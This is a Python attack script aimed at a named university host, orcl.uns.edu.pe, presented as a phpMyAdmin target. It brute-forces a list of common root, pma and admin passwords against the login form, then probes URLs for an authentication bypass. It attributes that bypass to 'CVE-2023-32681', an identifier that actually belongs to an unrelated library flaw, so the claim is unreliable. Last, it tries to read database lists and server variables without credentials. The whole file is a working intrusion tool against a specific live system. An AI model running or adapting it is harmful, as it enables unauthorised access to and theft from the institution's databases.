#!/usr/bin/env python3
import requests, urllib3, re, time
urllib3.disable_warnings()

print("=== BRUTE FORCE phpMyAdmin ===\n")

# Check phpMyAdmin login page
s = requests.Session()
s.verify = False
s.headers.update({'User-Agent': 'Mozilla/5.0'})

r = s.get('https://orcl.uns.edu.pe/', timeout=5)
print(f"phpMyAdmin status: {r.status_code}")
print(f"Page length: {len(r.text)}")

# Check for login form
if 'pma_username' in r.text or 'username' in r.text.lower():
    print("[!] Login form found")

# Check for version
if '5.2.3' in r.text or 'PmaAbsoluteUri' in r.text:
    print("[!] phpMyAdmin version confirmed")

# ============================================
# BRUTE FORCE COMMON CREDENTIALS
# ============================================
print("\n=== BRUTE FORCE CREDENCIALES ===\n")

# Common MySQL/MariaDB credentials
credentials = [
    ('root', ''),
    ('root', 'root'),
    ('root', 'password'),
    ('root', '123456'),
    ('root', 'admin'),
    ('root', 'toor'),
    ('root', 'mysql'),
    ('root', '1234'),
    ('root', 'pass'),
    ('root', 'qwerty'),
    ('root', 'abc123'),
    ('root', 'admin123'),
    ('root', '12345678'),
    ('root', 'passw0rd'),
    ('root', 'password123'),
    ('root', 'letmein'),
    ('root', 'welcome'),
    ('root', 'monkey'),
    ('root', 'dragon'),
    ('root', 'master'),
    ('root', 'default'),
    ('root', 'oracle'),
    ('pma', 'pma'),
    ('pma', ''),
    ('admin', 'admin'),
    ('admin', 'password'),
    ('admin', '123456'),
]

# Test each credential
# phpMyLogin form fields are typically: pma_username, pma_password
# Or: username, password

successful = []
failed = 0

for username, password in credentials:
    s_bf = requests.Session()
    s_bf.verify = False
    s_bf.headers.update({
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://orcl.uns.edu.pe/',
    })
    
    # Try POST with different form field names
    login_data_options = [
        {'pma_username': username, 'pma_password': password, 'server': '1', 'target': 'index.php'},
        {'username': username, 'password': password},
        {'pma_username': username, 'pma_password': password},
    ]
    
    for login_data in login_data_options:
        try:
            r_login = s_bf.post('https://orcl.uns.edu.pe/index.php',
                                    data=login_data, timeout=5, allow_redirects=True)
            
            # Check if login was successful
            # Successful login: redirect to main page with no login form
            # Failed login: still shows login form or error message
            
            if 'pma_username' not in r_login.text and 'username' not in r_login.text.lower() and 'login' not in r_login.text.lower():
                # Might be successful - check for phpMyAdmin main page
                if 'MySQL' in r_login.text or 'Database' in r_login.text or 'phpMyAdmin' in r_login.text:
                    print(f"[!] SUCCESS: {username}/{password}")
                    successful.append((username, password))
                    break
            
            # Check if cookies were set (session created)
            if len(s_bf.cookies) > 0:
                cookies = dict(s_bf.cookies)
                if 'pma' in str(cookies).lower() or 'phpmyadmin' in str(cookies).lower():
                    print(f"[!] SESSION CREATED: {username}/{password}")
                    successful.append((username, password))
                    break
            
            # Check if we got redirected to a different page
            if r_login.url != 'https://orcl.uns.edu.pe/index.php' and 'login' not in r_login.url.lower():
                print(f"[!] REDIRECTED: {username}/{password} -> {r_login.url}")
                successful.append((username, password))
                break
                
        except Exception as e:
            pass
    
    if len(successful) > 0:
        break
    
    failed += 1
    if failed % 10 == 0:
        print(f"  Tested {failed} credentials...")

print(f"\n=== RESULTADOS ===")
print(f"Successful: {len(successful)}")
print(f"Failed: {failed}")
if successful:
    for user, pwd in successful:
        print(f"  {user}/{pwd}")

# ============================================
# INTENTAR CVE-2023-32681
# ============================================
print("\n=== CVE-2023-32681 ===\n")

# phpMyAdmin 5.2.3 has a known auth bypass vulnerability
# Try to exploit it

# The vulnerability involves session token manipulation
# Try to access phpMyAdmin without proper authentication
cve_payloads = [
    'https://orcl.uns.edu.pe/index.php?target=db_sql.php',
    'https://orcl.uns.edu.pe/index.php?target=navigation.php',
    'https://orcl.uns.edu.pe/setup/index.php',
]

for cve_url in cve_payloads:
    try:
        r_cve = s.get(cve_url, timeout=5)
        if 'phpMyAdmin' in r_cve.text and 'login' not in r_cve.text.lower():
            print(f"[!] CVE-2023-32681 possibly exploitable: {cve_url}")
        else:
            print(f"  Not exploitable: {cve_url}")
    except:
        print(f"  Error: {cve_url}")

# ============================================
# VERIFICAR SI HAY BASES DE DATOS LISTAS
# ============================================
print("\n=== BASES DE DATOS ===\n")

# Try to access phpMyAdmin without login
# Check if any databases are listed
r_db = s.get('https://orcl.uns.edu.pe/root/', timeout=5)
tc_db = re.sub(r'<[^>]+>', ' ', r_db.text)
tc_db = re.sub(r'\s+', ' ', tc_db).strip()
if 'database' in tc_db.lower() and 'login' not in tc_db.lower():
    print(f"[!] Databases listed without login!")
    print(f"  {tc_db[:300]}")

# Try to access the database list
r_db2 = s.get('https://orcl.uns.edu.pe/root/dblist.php', timeout=5)
tc_db2 = re.sub(r'<[^>]+>', ' ', r_db2.text)
tc_db2 = re.sub(r'\s+', ' ', tc_db2).strip()
print(f"\ndblist status: {r_db2.status_code}")
if 'database' in tc_db2.lower():
    print(f"[!] Database list accessible!")

# Try to get the MySQL version
r_ver = s.get('https://orcl.uns.edu.pe/root/server_variables.php', timeout=5)
if 'version' in r_ver.text.lower():
    print("[!] Server variables accessible!")

print("\n=== CONCLUSION ===")
print("Si la BD esta expuesta, el brute force puede encontrar credenciales")
print("Si CVE-2023-32681 funciona, se puede acceder sin credenciales")
